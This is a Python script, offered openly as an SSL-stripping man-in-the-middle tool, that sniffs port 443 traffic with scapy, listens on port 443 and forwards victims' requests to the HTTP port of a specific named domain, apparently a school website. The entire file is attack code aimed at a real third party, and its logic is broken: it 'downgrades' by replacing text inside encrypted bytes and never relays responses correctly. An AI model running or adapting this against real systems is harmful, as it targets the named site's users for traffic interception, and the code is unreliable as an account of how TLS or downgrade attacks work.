import socket
import threading
from scapy.all import *
import ssl

# Define the target and port for SSL stripping
TARGET_HOST = "zsbitovska.cz"
TARGET_PORT = 443
HTTP_PORT = 80

# Function to handle client communication
def handle_client(client_socket):
    request = client_socket.recv(1024)
    
    # If the request is an HTTPS request, downgrade it to HTTP
    if b"HTTPS" in request:
        # Modify the request to be an HTTP request (removing the HTTPS part)
        request = request.replace(b"HTTPS", b"HTTP")
        
    # Forward the modified request to the target server (HTTP port)
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as forward_socket:
        forward_socket.connect((TARGET_HOST, HTTP_PORT))
        forward_socket.send(request)
        
        # Receive the response from the target
        response = forward_socket.recv(4096)
        
        # Send the response back to the client
        client_socket.send(response)

    client_socket.close()

# Function to listen for incoming connections
def start_sniffer():
    sniff(filter="tcp port 443", prn=packet_callback, store=0)

# Packet callback function for sniffing packets
def packet_callback(packet):
    if packet.haslayer(TCP) and packet.haslayer(IP):
        if packet[TCP].dport == TARGET_PORT:
            print(f"Intercepted traffic to {TARGET_HOST}:{TARGET_PORT}")
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_socket.connect((TARGET_HOST, TARGET_PORT))

            # Send an HTTP request instead of HTTPS
            request = f"GET / HTTP/1.1\r\nHost: {TARGET_HOST}\r\nConnection: close\r\n\r\n"
            client_socket.send(request.encode())

            # Receive HTTP response
            response = client_socket.recv(4096)

            # Send back to the client, simulating HTTP
            print(f"Sending downgraded HTTP response to the client")
            client_socket.close()

# Start the server to handle SSL stripping
def ssl_stripping_server():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(("0.0.0.0", 443))
    server_socket.listen(5)
    
    while True:
        client_socket, addr = server_socket.accept()
        print(f"Connection from {addr}")
        client_handler = threading.Thread(target=handle_client, args=(client_socket,))
        client_handler.start()

# Run the sniffer and server simultaneously
def main():
    # Start sniffing the traffic in a background thread
    sniffer_thread = threading.Thread(target=start_sniffer)
    sniffer_thread.start()

    # Start the SSL stripping server
    ssl_stripping_server()

if __name__ == "__main__":
    main()
